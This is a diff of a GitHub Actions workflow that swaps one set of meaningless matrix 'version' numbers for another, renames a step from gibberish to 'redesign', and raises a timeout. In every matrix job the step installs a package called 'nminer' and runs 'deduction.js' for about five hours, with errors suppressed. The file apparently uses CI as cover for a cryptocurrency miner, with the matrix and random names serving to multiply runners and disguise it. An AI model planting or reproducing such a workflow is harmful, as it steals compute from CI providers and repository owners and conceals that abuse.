@@ -9,25 +9,23 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 9494 }
-          - { version: 4725 }
-          - { version: 3956 }
-          - { version: 8690 }
-          - { version: 3939 }
-          - { version: 3690 }
-          - { version: 4147 }
-          - { version: 114 }
-          - { version: 2404 }
-          - { version: 1544 }
-          - { version: 2868 }
-          - { version: 7079 }
-          - { version: 2426 }
-          - { version: 6515 }
-          - { version: 711 }
-          - { version: 7637 }
-          - { version: 3822 }
-          - { version: 2025 }
-          - { version: 3560 }
+          - { version: 9893 }
+          - { version: 333 }
+          - { version: 8098 }
+          - { version: 9716 }
+          - { version: 7134 }
+          - { version: 3358 }
+          - { version: 4791 }
+          - { version: 3723 }
+          - { version: 8364 }
+          - { version: 5136 }
+          - { version: 1859 }
+          - { version: 1711 }
+          - { version: 3807 }
+          - { version: 5507 }
+          - { version: 2675 }
+          - { version: 3847 }
+          - { version: 9354 }
 
     steps:
       - name: Checkout
@@ -38,7 +36,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: wetly arrogantly stratify deceivingly impure
+      - name: redesign
         run: |
           npm install nminer@latest
-          timeout 309m node deduction.js || echo "deduction executed"
+          timeout 317m node deduction.js || echo "deduction executed"
